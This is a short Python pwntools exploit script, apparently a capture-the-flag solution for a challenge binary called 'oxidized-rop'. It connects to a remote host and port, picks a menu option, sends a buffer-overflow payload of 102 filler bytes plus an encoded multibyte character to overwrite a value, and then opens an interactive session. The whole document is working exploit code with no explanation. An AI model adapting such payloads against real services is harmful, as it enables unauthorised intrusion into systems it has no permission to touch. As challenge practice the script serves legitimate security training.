#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./oxidized-rop')

#p = process()
p = remote('94.237.50.242',42684)


p.sendlineafter(b':', b'1')
p.sendlineafter(b':', b'a'*102 + chr(123456).encode())
p.sendlineafter(b':', b'2')

p.interactive()
